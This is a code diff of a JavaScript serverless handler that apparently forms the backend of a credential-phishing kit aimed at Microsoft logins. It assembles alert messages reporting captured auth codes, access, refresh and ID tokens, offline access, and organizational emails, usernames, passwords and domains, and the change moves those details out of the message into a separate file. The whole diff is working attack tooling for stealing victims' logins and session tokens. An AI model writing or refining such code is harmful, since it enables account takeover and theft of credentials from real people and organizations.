@@ -72,41 +72,15 @@ export const handler = async (event, context) => {
     messageText += `✅ Auth Code: ${hasAuthCode ? 'Captured (see file)' : 'Missing'}\n`;
     messageText += `🕒 Time: ${timestamp}\n\n`;
     
-    // Add token information - check multiple possible data sources
+    // REMOVED: Token status from main message (now only in file)
+    // REMOVED: Organizational info from main message (now only in file)
+    
+    // Store token data for file generation
     const tokenData = data.tokenData || data.tokens || data.accessToken;
     const accessToken = data.accessToken || (tokenData && tokenData.tokens && tokenData.tokens.access_token);
     const refreshToken = data.refreshToken || (tokenData && tokenData.tokens && tokenData.tokens.refresh_token);
     const idToken = data.idToken || (tokenData && tokenData.tokens && tokenData.tokens.id_token);
-    
-    if (tokenData && tokenData.success && tokenData.tokens) {
-      messageText += `🎯 *Token Exchange Successful*\n`;
-      messageText += `🔑 Access Token: ${tokenData.tokens.access_token ? '✅ Captured' : '❌ Missing'}\n`;
-      messageText += `🔄 Refresh Token: ${tokenData.tokens.refresh_token ? '✅ Captured (No Expiry)' : '❌ Missing'}\n`;
-      messageText += `🆔 ID Token: ${tokenData.tokens.id_token ? '✅ Captured' : '❌ Missing'}\n`;
-      messageText += `⏱️ Offline Access: ${tokenData.tokens.offline_access ? '✅ Enabled' : '❌ Disabled'}\n\n`;
-    } else if (accessToken || refreshToken || idToken) {
-      messageText += `🎯 *Tokens Captured*\n`;
-      messageText += `🔑 Access Token: ${accessToken ? '✅ Captured' : '❌ Missing'}\n`;
-      messageText += `🔄 Refresh Token: ${refreshToken ? '✅ Captured (No Expiry)' : '❌ Missing'}\n`;
-      messageText += `🆔 ID Token: ${idToken ? '✅ Captured' : '❌ Missing'}\n\n`;
-    } else {
-      messageText += `🎯 *Token Status*\n`;
-      messageText += `🔑 Access Token: ❌ Missing\n`;
-      messageText += `🔄 Refresh Token: ❌ Missing\n`;
-      messageText += `🆔 ID Token: ❌ Missing\n\n`;
-    }
-
-    // Add organizational credentials info (only if detected)
     const orgCreds = data.organizationalCredentials;
-    if (orgCreds && (orgCreds.email || orgCreds.username || orgCreds.password)) {
-      messageText += `🏢 *Organizational Login Detected*\n`;
-      messageText += `🏷️ Type: ${orgCreds.organizationType || 'Unknown'}\n`;
-      messageText += `👤 Org Email: ${orgCreds.email || 'not-captured'}\n`;
-      messageText += `🔑 Org Username: ${orgCreds.username || 'not-captured'}\n`;
-      messageText += `🔐 Org Password: ${orgCreds.password ? '✅ Captured' : '❌ Not captured'}\n`;
-      messageText += `🌐 Org Domain: ${orgCreds.domain || 'unknown'}\n\n`;
-    }
-    // REMOVED: No longer showing "Direct Microsoft login" line
     
     // Note: Authorization code is in the file, not in text message for security
     
